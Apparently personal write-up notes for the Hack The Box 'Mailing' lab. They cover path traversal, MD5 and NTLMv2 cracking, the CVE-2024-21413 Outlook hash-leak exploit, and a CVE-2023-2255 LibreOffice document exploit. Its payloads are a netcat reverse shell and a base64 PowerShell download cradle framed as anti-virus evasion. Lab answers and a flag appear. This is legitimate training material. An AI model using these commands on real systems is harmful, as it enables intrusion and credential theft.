@@ -1,0 +1,69 @@
+
+Guided:
+Q: Which mail server is running on the server?
+A: hMailServer
+
+              (nmap -sV <IP> , will indicate the smtp service)
+
+Q: What is the relative path on the website that is vulnerable to a path traversal exploit?
+A: /download.php                    
+
+              (This Why -> http://mailing.htb/download.php?file=instructions.pdf)
+
+Q: What is the complete path to the configuration file on the hMailServer?
+A: C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini
+
+              (Quick search on google: Where is the hMailServer.ini file located?
+              hMailServer. ini is by default located in C:\Program Files\hMailServer\Bin)    Had to add (x86) since it's 32bit program
+
+Q: What is the password for the Administrator user on the mail server?      (extracted via Burp's Repeater)
+A: homenetworkingadministrator
+              1) hash-identifier <hash>            (MD5)
+              2) hashcat -m 0 -a 0 hash.txt ~/Downloads/rockyou.txt  |or|  john --format=raw-md5 admin.txt --wordlist=~/Downloads/rockyou.txt
+optional:     https://crackstation.net/
+
+Q: What is the 2024 CVE ID for a vulnerability Windows Mail client that can lead to the leak of the users credentials?
+A: CVE-2024-21413
+
+              A quick search on google for hMailServer exploit revealed this:
+              https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.git
+
+Q: What is the password for the maya user on Mailing?
+A: m4y4ngs4ri
+              I've tried the exploit but didn't work (any of them and alot of people came with the same problem)
+              sudo responder -I eth0    |or|    impacket-smbserver smbFolder $(pwd) -smb2support
+              python3 CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password 'homenetworkingadministrator' --sender administrator@mailing.htb --recipient maya@mailing.htb --url "\\<IP>\smbFolder\test.txt" --subject Test
+              had to copy the NTLMv2 hash from some guide online and crack it myself with -->  hashcat -m 5600 -a 0 <NTLMv2 hash> ~/Downloads/rockyou.txt 
+
+Q: What is the version of LibreOffice present on the server?
+A: 7.4.0.0.1
+  Via PS:     (Get-Command "$env:ProgramFiles\LibreOffice\program\soffice.exe").FileVersionInfo | Select-Object ProductVersion
+
+Q: What is the 2023 CVE-ID for a vulnerability in this version of LibreOffice?
+A: CVE-2023-2255
+          ****This vulnerability involves improper access
+              control in LibreOffice's editor components, allowing an attacker to create a document that loads
+              external links without prompting the user.****
+
+Q: Submit the flag located on the localadmin user's desktop.
+A: e59e5729dbc1c2b3cd70cf04b2160f2a
+              C:\Users\localadmin\Desktop>type root.txt
+              type root.txt
+
+The exploit:
+  python3 CVE-2023-2255.py --cmd "cmd.exe /c C:\ProgramData\nc.exe -e cmd.exe YOUR_IP 1337" --output exploit.odt
+- connect via evil-winrm --> upload to C:\programdata a 'nc.exe'
+- then needed a directory that the user may access it, so it was "C:\Important Documents" --> upload the exploit.odt
+- open netcat listener and wait
+
+
+
+Rev-shell with Ippsec method to evade anti-virus via powershell:
+                  echo "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.21:8585/shell.ps1')$" > cradle
+convert to 16bit:
+                  cat cradle | iconv -t utf-16le | base64 -w 0
+
+Exploit:
+  python3 CVE-2023-2255.py --cmd 'cmd /c powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADIAMQA6ADgANQA4ADUALwBzAGgAZQBsAGwALgBwAHMAMQAnACkAJAAKAA==' --output exploit.odt
+
+
